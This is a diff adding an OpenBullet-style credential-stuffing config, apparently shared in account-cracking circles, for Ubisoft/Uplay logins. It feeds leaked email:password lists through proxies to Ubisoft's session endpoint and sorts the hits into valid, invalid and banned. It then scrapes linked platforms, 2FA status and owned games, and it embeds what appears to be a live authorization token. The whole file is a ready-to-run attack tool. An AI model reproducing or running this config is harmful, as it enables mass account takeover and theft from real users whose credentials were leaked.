@@ -1,0 +1,110 @@
+[SETTINGS]
+{
+  "Name": "Uplay V2",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-19T04:03:58.4305086+02:00",
+  "AdditionalInfo": "Last Fixed By Horus God - 2019-08-19",
+  "Author": "NestleNutella (fixed by sp6off & HorusGod)",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Base64Encode "<USER>:<PASS>" -> VAR "auth" 
+
+REQUEST POST "https://connect.ubi.com/ubiservices/v3/profiles/sessions" 
+  CONTENT "{}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Host: public-ubiservices.ubi.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://connect.ubisoft.com/login?appId=e06033f4-28a4-43fb-8313-6c2d882bc4a6&lang=fr-FR&nextUrl=https:%2F%2Foverlay.ubisoft.com%2Foverlay-connect-integration%2Flogged-in.html&genomeId=031c6c79-623d-4831-9c01-0f01d1f77c88" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Ubi-AppId: e06033f4-28a4-43fb-8313-6c2d882bc4a6" 
+  HEADER "Ubi-RequestedPlatformType: uplay" 
+  HEADER "GenomeId: 031c6c79-623d-4831-9c01-0f01d1f77c88" 
+  HEADER "Authorization: Basic <auth>" 
+  HEADER "Origin: https://connect.ubisoft.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "profileId" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials" 
+  KEYCHAIN Ban OR 
+    KEY "The Ubi-Challenge header is required." 
+
+#PARSE_PROFILEID PARSE "<SOURCE>" LR "\"profileId\":\"" "\"," -> VAR "profileid" 
+
+#PARSE_USERNAME PARSE "<SOURCE>" LR "\"nameOnPlatform\":\"" "\"," -> CAP "Username" 
+
+REQUEST GET "https://public-ubiservices.ubi.com/v3/users/<profileid>/profiles?" 
+  
+  HEADER "Authorization: Ubi_v1 t=ew0KICAidmVyIjogIjEiLA0KICAiYWlkIjogImM1MzkzZjEwLTdhYzctNGI0Zi05MGZhLTIxZjhmMzQ1MWEwNCIsDQogICJlbnYiOiAiUHJvZCIsDQogICJzaWQiOiAiMWFiNTczYzUtN2ZkMy00OTg4LTk2OTQtMDBkOWMzNjBmYmUzIiwNCiAgInR5cCI6ICJKV0UiLA0KICAiZW5jIjogIkExMjhDQkMiLA0KICAiaXYiOiAiMUM1dkdTVkQ2dzZQcHhWVDJBX3pJZyIsDQogICJpbnQiOiAiSFMyNTYiDQp9.C2_jQBf8Re69Ryl__Dri-ZhpNNON2PDwh5pc6DBgMvLZqIVPTXT7zrNRzu5ow-adFHVSM5NoLA_bA1JMi8Agj4dt2pw2AZ-mf74OalNVrTjjzFTpaFm1kxWM10rC7O5Pw-7gXoNDM3UCUV5RFqiThTCGhOoFOxKMcqWHoRzQrUxnEvMA0YZYTXf085JTmxFdmjRzx-eZfOUae3k78OHWDY-vqDD7Cv_igxvk0bQWnSwMEiu-s6EIge2i2lNXqyB0rG5GsfFJ2sIZCrGrTWCxCZGeZ8CmpD9QsFwEx2QiA6oJLGv2-nKrvEQmYye14fjOR8rOkeRURxWPRMgk0jqjMYYfYYK384ZSNEAlfnQx8qUTbB5x-fm7DZOG76P_HvFfaTDaqfmv2tpiDhTIXpd7GkeehbO7bPb1vM9F_APj4idIInAFnVuwhtFr21m8HY4bpgvHdjvQQG7GH8JK1f9eI_m3CmTVEbHLgpI5Io1CTJkx2qIwUesfrmA7OPsVEwgIQlNfh6xSzgS2PHcaN9tMFUhgIsfGXdmOc84_yMgp2xEZU_jnHQJFEcHGp1yknH0epBy03ZpzLASnPlSjR87l_a_f5lJjGCVo-05mA2nqKNJaFCUFwsHCHUtDpHmKAEUq136OeGIqSrHsCY5uyGa9im4FpBQhOT6Sy1UwKyz3i9Dl92iu4DJjxqpeLrDsXs05_yvKQuL2-HFtJa4ftM8mVi3PP7UeHJFQssRr7YEdi_SeFB1tKLsK7reGA2uROTO7nXl3-t6fU1UU3iX8Gw-WKSBY_6XT5Lz1kbqpZmtKe9nYtkqPHAXTgv58Z1ynuyLBfsD_8dIu72kcF57StfdfLifi-AullwG90jagQGCbDpWhuF6Eeq0orXJQlbx1yAVD66Diuyer1K8D0owRfNMxtiVG77eqwQaidosntIOL-5XHYKxWOBof0bexiMwgW-9JbrM7e2qesOlrCuyLZW9z5dbETYlCwbaKG-BSb2GaP3C7WbY4jskYhH8clevFpt4vLKpaCEuDTgyLHhmqyaSLbKppjnMF7EDfjiBQRIJfyLHfg48M_wMbYPSkAUeWHgf5cTTeblUc6QwrYIrwWeGVuYtPLxepz59-b4I3GKZXIkovYn8idldWLYG6zR9zMuNkS67bXsyxac4t08aomOu9pRK-j7AF8COEmmYwBCcVXJ8WbbgW1AZh8SdpSt8GHF7ymwWrKo--0TPpIVtGTJyhytA_KDCnoA1S7Xq4x7EVhF0ACahJ4HKo2fw5dHjGVoxv2qCaWuZn7aPUMd_AiguQLzju4188JzHmI9sAbl9zsNz4uEMxuQ_rI0PzZ7dHkuN53LLOgg9STXCBIkiFjbK43g.IK6m8IlQ_00-7QMLS16o15lyOCI-shkscixoFLKa64c" 
+  HEADER "Referer: https://account.ubisoft.com/en-US/overview" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Ubi-AppId: c5393f10-7ac7-4b4f-90fa-21f8f3451a04" 
+  HEADER "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "\"platformType\":\"" "\"" Recursive=TRUE -> CAP "Linked Account" 
+
+#CHECK_2FA REQUEST GET "https://connect.ubisoft.com/api/default/check2fa" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "\"optin\"" VALUE "OptIn Enabled" 
+  KEY "\"active\"" VALUE "2FA Enabled" 
+  "<SOURCE>" -> CAP "2FAVerification" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"active\":false" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"active\":true" 
+
+REQUEST GET "https://public-ubiservices.ubi.com/v1/profiles/me/club/aggregation/website/games/owned?" 
+  
+  HEADER "Host: public-ubiservices.ubi.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://club.ubisoft.com/fr-FR/games/" 
+  HEADER "Authorization: Ubi_v1 t=ew0KICAidmVyIjogIjEiLA0KICAiYWlkIjogImM1MzkzZjEwLTdhYzctNGI0Zi05MGZhLTIxZjhmMzQ1MWEwNCIsDQogICJlbnYiOiAiUHJvZCIsDQogICJzaWQiOiAiMWFiNTczYzUtN2ZkMy00OTg4LTk2OTQtMDBkOWMzNjBmYmUzIiwNCiAgInR5cCI6ICJKV0UiLA0KICAiZW5jIjogIkExMjhDQkMiLA0KICAiaXYiOiAiMUM1dkdTVkQ2dzZQcHhWVDJBX3pJZyIsDQogICJpbnQiOiAiSFMyNTYiDQp9.C2_jQBf8Re69Ryl__Dri-ZhpNNON2PDwh5pc6DBgMvLZqIVPTXT7zrNRzu5ow-adFHVSM5NoLA_bA1JMi8Agj4dt2pw2AZ-mf74OalNVrTjjzFTpaFm1kxWM10rC7O5Pw-7gXoNDM3UCUV5RFqiThTCGhOoFOxKMcqWHoRzQrUxnEvMA0YZYTXf085JTmxFdmjRzx-eZfOUae3k78OHWDY-vqDD7Cv_igxvk0bQWnSwMEiu-s6EIge2i2lNXqyB0rG5GsfFJ2sIZCrGrTWCxCZGeZ8CmpD9QsFwEx2QiA6oJLGv2-nKrvEQmYye14fjOR8rOkeRURxWPRMgk0jqjMYYfYYK384ZSNEAlfnQx8qUTbB5x-fm7DZOG76P_HvFfaTDaqfmv2tpiDhTIXpd7GkeehbO7bPb1vM9F_APj4idIInAFnVuwhtFr21m8HY4bpgvHdjvQQG7GH8JK1f9eI_m3CmTVEbHLgpI5Io1CTJkx2qIwUesfrmA7OPsVEwgIQlNfh6xSzgS2PHcaN9tMFUhgIsfGXdmOc84_yMgp2xEZU_jnHQJFEcHGp1yknH0epBy03ZpzLASnPlSjR87l_a_f5lJjGCVo-05mA2nqKNJaFCUFwsHCHUtDpHmKAEUq136OeGIqSrHsCY5uyGa9im4FpBQhOT6Sy1UwKyz3i9Dl92iu4DJjxqpeLrDsXs05_yvKQuL2-HFtJa4ftM8mVi3PP7UeHJFQssRr7YEdi_SeFB1tKLsK7reGA2uROTO7nXl3-t6fU1UU3iX8Gw-WKSBY_6XT5Lz1kbqpZmtKe9nYtkqPHAXTgv58Z1ynuyLBfsD_8dIu72kcF57StfdfLifi-AullwG90jagQGCbDpWhuF6Eeq0orXJQlbx1yAVD66Diuyer1K8D0owRfNMxtiVG77eqwQaidosntIOL-5XHYKxWOBof0bexiMwgW-9JbrM7e2qesOlrCuyLZW9z5dbETYlCwbaKG-BSb2GaP3C7WbY4jskYhH8clevFpt4vLKpaCEuDTgyLHhmqyaSLbKppjnMF7EDfjiBQRIJfyLHfg48M_wMbYPSkAUeWHgf5cTTeblUc6QwrYIrwWeGVuYtPLxepz59-b4I3GKZXIkovYn8idldWLYG6zR9zMuNkS67bXsyxac4t08aomOu9pRK-j7AF8COEmmYwBCcVXJ8WbbgW1AZh8SdpSt8GHF7ymwWrKo--0TPpIVtGTJyhytA_KDCnoA1S7Xq4x7EVhF0ACahJ4HKo2fw5dHjGVoxv2qCaWuZn7aPUMd_AiguQLzju4188JzHmI9sAbl9zsNz4uEMxuQ_rI0PzZ7dHkuN53LLOgg9STXCBIkiFjbK43g.IK6m8IlQ_00-7QMLS16o15lyOCI-shkscixoFLKa64c" 
+  HEADER "Ubi-AppId: 314d4fef-e568-454a-ae06-43e3bece12a6" 
+  HEADER "Ubi-LocaleCode: fr-FR" 
+  HEADER "Origin: https://club.ubisoft.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+
+#PARSE_NAMES PARSE "<SOURCE>" LR "\"title\":\"" "\"," Recursive=TRUE -> CAP "Games owned" 
+
+#PARSE_PLATFORMS PARSE "<SOURCE>" LR "\"platform\":\"" "\"," Recursive=TRUE -> CAP "Platforms" 
+
